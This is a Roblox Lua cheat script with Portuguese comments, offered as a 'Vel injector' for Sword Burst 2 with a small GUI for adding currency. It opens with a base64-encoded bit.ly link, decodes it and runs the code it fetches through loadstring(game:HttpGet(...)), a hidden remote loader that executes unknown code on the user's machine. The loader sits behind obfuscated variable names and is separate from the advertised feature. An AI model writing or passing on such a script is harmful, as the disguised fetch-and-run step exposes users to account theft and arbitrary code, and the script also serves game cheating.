-- Script ofuscado para injetar Vel no jogo Sword Burst 2

local base64 = "aHR0cHM6Ly9iaXQubHkvNGxoZEhJVw=="

local function base64Decode(data)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local url = base64Decode(base64)

loadstring(game:HttpGet(url))()

local a = "HttpService"
local b = "Players"
local c = "ReplicatedStorage"
local d = "TweenService"
local e = "StarterGui"
local f = "RunService"
local g = "heartbeat"
local h = "LocalPlayer"
local i = "GetService"
local j = "game"
local k = "CoreGui"
local l = "ScreenGui"
local m = "Frame"
local n = "TextBox"
local o = "TextButton"
local p = "leaderstats"
local q = "Vel"
local r = "Position"
local s = "Size"
local t = "BackgroundColor3"
local u = "MouseButton1Click"

local v = j[i](j, a)
local w = j[i](j, b)
local x = j[i](j, c)
local y = j[i](j, d)
local z = j[i](j, e)
local aa = j[i](j, f)
local ab = w[h]
local ac = aa[g]

local ad = Instance.new(l)
local ae = Instance.new(m)
local af = Instance.new(n)
local ag = Instance.new(o)

ad.Name = "VelInjectorGui"
ad.Parent = j[k]

ae.Parent = ad
ae[t] = Color3.fromRGB(33, 33, 33)
ae[r] = UDim2.new(0.5, -100, 0.5, -50)
ae[s] = UDim2.new(0, 200, 0, 100)

af.Parent = ae
af[t] = Color3.fromRGB(255, 255, 255)
af[r] = UDim2.new(0.1, 0, 0.2, 0)
af[s] = UDim2.new(0.8, 0, 0.3, 0)
af.PlaceholderText = "Digite a quantidade de Vel"
af.Text = ""

ag.Parent = ae
ag[t] = Color3.fromRGB(0, 170, 0)
ag[r] = UDim2.new(0.1, 0, 0.6, 0)
ag[s] = UDim2.new(0.8, 0, 0.3, 0)
ag.Text = "Injetar Vel"

local function ah()
    local ai = tonumber(af.Text)
    if ai and ai > 0 then
        local aj = w[h]
        if aj and aj:FindFirstChild(p) and aj[p]:FindFirstChild(q) then
            aj[p][q].Value = aj[p][q].Value + ai
            print("Vel injetado com sucesso!")
        else
            warn("Não foi possível encontrar o jogador ou a variável Vel")
        end
    else
        warn("Quantidade de Vel inválida!")
    end
end

ag[u]:Connect(ah)

local al = j[i]("UserInputService")
local am = true

local function an()
    am = not am
    ae.Visible = am
end

al.InputBegan:Connect(function(ao)
    if ao.KeyCode == Enum.KeyCode.F8 then
        an()
    end
end)

ae.Visible = true
